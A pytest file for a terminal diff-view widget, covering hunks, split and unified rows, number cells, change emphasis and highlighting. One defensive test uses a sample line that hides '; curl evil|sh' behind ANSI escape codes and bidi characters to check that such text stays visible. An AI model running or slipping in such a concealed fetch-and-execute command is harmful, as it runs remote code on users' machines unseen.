# Copyright (c) Huawei Technologies Co., Ltd. 2026. All rights reserved.

"""Tests for the parts of the diff view that need no app: its hunks, rows, cells and marks."""

from __future__ import annotations

import pytest
from textual.content import Content
from textual.style import Style

from chrys.app.tui.widgets import HATCH_GLYPH
from chrys.app.tui.widgets.diff_view import DiffView
from chrys.app.tui.widgets.diff_view.cells import annotation_cell, number_cell, number_cell_width
from chrys.app.tui.widgets.diff_view.compute import compute_highlighted_lines, compute_hunks, emphasize_changes
from chrys.app.tui.widgets.diff_view.inline import InlineUnifiedDiffLines
from chrys.app.tui.widgets.diff_view.palette import ADDED_EMPHASIS, DARK, LIGHT, REMOVED_EMPHASIS, DiffLook
from chrys.app.tui.widgets.diff_view.rows import (
    BREAK_ROW,
    FILLER_ROW,
    DiffRow,
    RowKind,
    Side,
    change_counts,
    code_width,
    number_width,
    split_rows,
    unified_rows,
)

_LOOK = DiffLook(DARK, "truecolor", Style())


def _lines(text: str) -> list[Content]:
    return [Content(line) for line in text.splitlines()]


def _shape(rows: list[DiffRow]) -> list[tuple[str, str | None, int | None, int | None]]:
    return [(row.kind.value, None if row.code is None else row.code.plain, row.before, row.after) for row in rows]


def _emphasis(line: Content) -> list[tuple[int, int]]:
    return [(span.start, span.end) for span in line.spans if span.style in {REMOVED_EMPHASIS, ADDED_EMPHASIS}]


def _numbered(count: int, changed: dict[int, str]) -> str:
    return "".join(changed.get(index, f"line {index}") + "\n" for index in range(count))


# -- hunks -------------------------------------------------------------------------------------------


def test_identical_texts_have_no_hunks() -> None:
    assert compute_hunks("same\n", "same\n") == []
    assert change_counts([]) == (0, 0)


def test_a_hunk_keeps_three_lines_of_context_on_either_side() -> None:
    hunks = compute_hunks(_numbered(30, {}), _numbered(30, {15: "changed"}))

    assert hunks == [[("equal", 12, 15, 12, 15), ("replace", 15, 16, 15, 16), ("equal", 16, 19, 16, 19)]]
    assert change_counts(hunks) == (1, 1)


def test_change_counts_tell_added_from_removed() -> None:
    hunks = compute_hunks("a\nb\nc\n", "a\nc\nd\ne\n")

    assert change_counts(hunks) == (2, 1)


# -- rows --------------------------------------------------------------------------------------------


def test_unified_rows_put_removed_lines_ahead_of_added_ones() -> None:
    before, after = "alpha\nbeta\n", "alpha\nBETA\ngamma\n"

    rows = unified_rows(compute_hunks(before, after), _lines(before), _lines(after))

    assert _shape(rows) == [
        ("context", "alpha", 1, 1),
        ("removed", "beta", 2, None),
        ("added", "BETA", None, 2),
        ("added", "gamma", None, 3),
    ]


def test_unified_rows_number_context_on_both_sides_once_the_texts_drift_apart() -> None:
    before, after = "a\nb\nc\n", "a\nc\n"

    rows = unified_rows(compute_hunks(before, after), _lines(before), _lines(after))

    assert _shape(rows) == [("context", "a", 1, 1), ("removed", "b", 2, None), ("context", "c", 3, 2)]


def test_a_break_row_stands_between_hunks_and_nowhere_else() -> None:
    before = _numbered(30, {})
    after = _numbered(30, {0: "first", 29: "last"})
    hunks = compute_hunks(before, after)

    unified = unified_rows(hunks, _lines(before), _lines(after))
    left, right = split_rows(hunks, _lines(before), _lines(after))

    assert len(hunks) == 2
    assert [index for index, row in enumerate(unified) if row is BREAK_ROW] == [5]
    assert [index for index, row in enumerate(left) if row is BREAK_ROW] == [4]
    assert [index for index, row in enumerate(right) if row is BREAK_ROW] == [4]


def test_split_rows_pair_from_the_top_and_fill_the_shorter_side() -> None:
    before, after = "alpha\nbeta\n", "alpha\nBETA\ngamma\n"

    left, right = split_rows(compute_hunks(before, after), _lines(before), _lines(after))

    assert _shape(left) == [("context", "alpha", 1, None), ("removed", "beta", 2, None), ("filler", None, None, None)]
    assert _shape(right) == [("context", "alpha", None, 1), ("added", "BETA", None, 2), ("added", "gamma", None, 3)]
    assert left[2] is FILLER_ROW


def test_split_rows_take_each_side_s_context_from_its_own_text() -> None:
    before = [Content("old"), Content.styled("same", "red")]
    after = [Content("new"), Content.styled("same", "green")]
    hunks = [[("replace", 0, 1, 0, 1), ("equal", 1, 2, 1, 2)]]

    left, right = split_rows(hunks, before, after)

    assert left[1].code is before[1]
    assert right[1].code is after[1]


def test_number_width_is_that_of_the_largest_number_on_any_side() -> None:
    rows = [DiffRow(RowKind.CONTEXT, Content("x"), before=9, after=120)]

    assert number_width(rows) == 3
    assert number_width([DiffRow(RowKind.REMOVED, Content("x"), before=9)], rows) == 3
    assert number_width([BREAK_ROW, FILLER_ROW]) == 1
    assert number_width() == 1


def test_code_width_counts_cells_and_is_never_zero() -> None:
    assert (
        code_width([DiffRow(RowKind.ADDED, Content("你好"), after=1), DiffRow(RowKind.ADDED, Content("abc"), after=2)])
        == 4
    )
    assert code_width([DiffRow(RowKind.ADDED, Content(""), after=1)]) == 1
    assert code_width([BREAK_ROW]) == 1


# -- cells -------------------------------------------------------------------------------------------


def test_number_cell_right_aligns_the_number_of_its_side() -> None:
    row = DiffRow(RowKind.CONTEXT, Content("x"), before=7, after=12)

    assert number_cell(row, _LOOK, side=Side.BEFORE, digits=3, edge=True).plain == "▎  7 "
    assert number_cell(row, _LOOK, side=Side.AFTER, digits=3, edge=False).plain == "  12 "
    assert number_cell_width(3) == 5


def test_number_cell_keeps_the_edge_on_a_row_with_no_number_on_its_side() -> None:
    added = DiffRow(RowKind.ADDED, Content("x"), after=4)

    cell = number_cell(added, _LOOK, side=Side.BEFORE, digits=2, edge=True)

    assert cell.plain == "▎   "
    assert [(span.start, span.end, span.style) for span in cell.spans] == [(0, 1, DARK.edge[RowKind.ADDED])]


def test_number_cell_styles_the_number_apart_from_the_edge() -> None:
    removed = DiffRow(RowKind.REMOVED, Content("x"), before=4)

    cell = number_cell(removed, _LOOK, side=Side.BEFORE, digits=1, edge=True)

    assert [(span.start, span.end, span.style) for span in cell.spans] == [
        (1, 3, DARK.number[RowKind.REMOVED]),
        (0, 1, DARK.edge[RowKind.REMOVED]),
    ]


@pytest.mark.parametrize("row", [FILLER_ROW, BREAK_ROW], ids=["filler", "break"])
def test_cells_of_a_placeholder_are_hatched(row: DiffRow) -> None:
    hatch = Style(bold=True)
    look = DiffLook(DARK, "truecolor", hatch)

    number = number_cell(row, look, side=Side.BEFORE, digits=2, edge=True)
    annotation = annotation_cell(row, look)

    assert row.is_placeholder
    assert (number.plain, annotation.plain) == (HATCH_GLYPH * 4, HATCH_GLYPH * 3)
    assert [(span.start, span.end, span.style) for span in number.spans] == [(0, 4, hatch)]
    assert [(span.start, span.end, span.style) for span in annotation.spans] == [(0, 3, hatch)]


def test_rows_of_code_are_no_placeholders() -> None:
    assert not any(
        DiffRow(kind, Content("x")).is_placeholder for kind in (RowKind.CONTEXT, RowKind.ADDED, RowKind.REMOVED)
    )


def test_annotation_cell_marks_changed_rows_on_their_line_s_background() -> None:
    light = DiffLook(LIGHT, "256", Style())

    added = annotation_cell(DiffRow(RowKind.ADDED, Content("x"), after=1), _LOOK)
    removed = annotation_cell(DiffRow(RowKind.REMOVED, Content("x"), before=1), light)

    assert (added.plain, removed.plain) == (" + ", " - ")
    assert annotation_cell(DiffRow(RowKind.CONTEXT, Content("x"), 1, 1), _LOOK).plain == "   "
    assert added.spans[0].style == DARK.line[RowKind.ADDED]
    # The light palette names no 256-color backgrounds of its own: its colors survive the downgrade.
    assert removed.spans[0].style == LIGHT.line[RowKind.REMOVED]


def test_dark_line_backgrounds_are_replaced_where_the_downgrade_would_lose_them() -> None:
    assert DARK.line_style(RowKind.ADDED, "256") == "on #005F00"
    assert DARK.line_style(RowKind.ADDED, "truecolor") == DARK.line[RowKind.ADDED]
    assert DARK.line_style(RowKind.CONTEXT, "256") == ""
    assert LIGHT.line_style(RowKind.REMOVED, None) == LIGHT.line[RowKind.REMOVED]


# -- marks within lines ------------------------------------------------------------------------------


def test_emphasis_marks_the_characters_that_differ() -> None:
    removed, added = emphasize_changes([Content("value = spam")], [Content("value = span")])

    assert _emphasis(removed[0]) == [(11, 12)]
    assert _emphasis(added[0]) == [(11, 12)]


def test_emphasis_compares_each_line_with_its_own_counterpart() -> None:
    removed, added = emphasize_changes(
        [Content("first = 1"), Content("totally different words")],
        [Content("first = 2"), Content("x")],
    )

    assert (_emphasis(removed[0]), _emphasis(added[0])) == ([(8, 9)], [(8, 9)])
    # Too unlike to be one edited line: marking nearly all of both would say nothing.
    assert (_emphasis(removed[1]), _emphasis(added[1])) == ([], [])


def test_emphasis_is_exact_on_a_long_line_of_repeated_characters() -> None:
    """``difflib`` treats characters that fill over 1% of a line of 200 or more as junk unless told not to."""
    removed, added = emphasize_changes([Content("x" * 300 + "a")], [Content("x" * 300 + "b")])

    assert (_emphasis(removed[0]), _emphasis(added[0])) == ([(300, 301)], [(300, 301)])


def test_emphasis_leaves_very_long_lines_alone() -> None:
    before, after = Content("x" * 600 + "a"), Content("x" * 600 + "b")

    removed, added = emphasize_changes([before], [after])

    assert (removed[0], added[0]) == (before, after)
    assert removed[0] is before


def test_emphasis_keeps_the_highlighting_under_it() -> None:
    before = Content.styled("spam", "bold")

    removed, _added = emphasize_changes([before], [Content("span")])

    assert [(span.start, span.end, span.style) for span in removed[0].spans] == [
        (0, 4, "bold"),
        (3, 4, REMOVED_EMPHASIS),
    ]


def test_replaced_blocks_of_unequal_length_pair_from_the_top() -> None:
    before = "foo(a, b)\nkeep\n"
    after = "foo(a, b, c)\nbar()\nkeep\n"
    hunks = compute_hunks(before, after)

    lines_before, lines_after = compute_highlighted_lines(before, after, "x.py", "x.py", hunks)

    assert hunks == [[("replace", 0, 1, 0, 2), ("equal", 1, 2, 2, 3)]]
    assert _emphasis(lines_before[0]) == []
    assert _emphasis(lines_after[0]) == [(8, 11)]
    assert _emphasis(lines_after[1]) == []


def test_pure_insertions_and_deletions_carry_no_emphasis() -> None:
    before, after = "a = 1\n", "a = 1\nb = 2\n"

    _lines_before, lines_after = compute_highlighted_lines(before, after, "x.py", "x.py", compute_hunks(before, after))

    assert [_emphasis(line) for line in lines_after] == [[], []]


# -- highlighting ------------------------------------------------------------------------------------


def test_highlighted_lines_are_the_lines_of_the_text() -> None:
    before = "def old():\n    return 1\n"
    after = "def new():\n\n    return 2\n\n\n"

    lines_before, lines_after = compute_highlighted_lines(before, after, "x.py", "x.py", compute_hunks(before, after))

    assert [line.plain for line in lines_before] == before.splitlines()
    # The highlighter swallows blank lines at the end of what it is given.
    assert [line.plain for line in lines_after] == after.splitlines()


def test_hunks_only_highlights_down_to_the_last_hunk_and_keeps_the_rest_plain() -> None:
    before = _numbered(40, {}).replace("line ", "value_").replace("\n", " = 1\n")
    after = before.replace("value_5 = 1", "value_5 = 2")
    hunks = compute_hunks(before, after)

    full_before, full_after = compute_highlighted_lines(before, after, "x.py", "x.py", hunks)
    sparse_before, sparse_after = compute_highlighted_lines(before, after, "x.py", "x.py", hunks, hunks_only=True)

    shown_end = hunks[-1][-1][2]
    assert shown_end == 9
    assert [line.plain for line in sparse_after] == after.splitlines()
    assert sparse_before[:shown_end] == full_before[:shown_end]
    assert sparse_after[:shown_end] == full_after[:shown_end]
    assert full_after[shown_end].spans
    assert all(not line.spans for line in sparse_after[shown_end:])


def test_hunks_only_without_hunks_highlights_everything() -> None:
    text = "value = 1\n"

    lines_before, _lines_after = compute_highlighted_lines(text, text, "x.py", "x.py", [], hunks_only=True)

    assert lines_before[0].spans


@pytest.mark.asyncio
async def test_both_diff_widgets_show_control_and_hidden_characters_as_marks() -> None:
    """A diff can show text a model or a remote agent wrote: each escape code,
    bidi control and zero-width character shows as a mark of its own, so none of
    them hides or reorders a line, and a tab still shows as spaces."""
    after = "echo safe\x1b[8m; curl evil|sh\x1b[0m\u202e\u200b\u2028\U000e0041\n\tdone\x0cnext\n"
    view = DiffView("run.sh", "run.sh", "", after)
    inline = InlineUnifiedDiffLines("run.sh", "run.sh", "", after)
    await inline.prepare()

    shown = ["echo safe�[8m; curl evil|sh�[0m����", "        done�next"]
    assert [line.plain for line in view.highlighted_lines[1]] == shown
    assert [row.code.plain for row in inline.rows if row.code is not None] == shown


@pytest.mark.asyncio
async def test_a_change_between_characters_shown_alike_still_shows() -> None:
    """Two characters shown as the same mark still differ, so the line that
    changes one into the other shows as changed, and every line keeps its place
    whichever break characters it holds."""
    before = "a\u200bb\r\nc\x1bd\x0cx\nsame\u2028tail\n"
    after = "a\u202eb\r\nc\x07d\x0cx\nsame\u2028tail\n"
    view = DiffView("f", "f", before, after)
    inline = InlineUnifiedDiffLines("f", "f", before, after)
    await inline.prepare()

    assert view.counts == (2, 2)
    assert _shape(inline.rows) == [
        ("removed", "a�b", 1, None),
        ("removed", "c�d�x", 2, None),
        ("added", "a�b", None, 1),
        ("added", "c�d�x", None, 2),
        ("context", "same�tail", 3, 3),
    ]
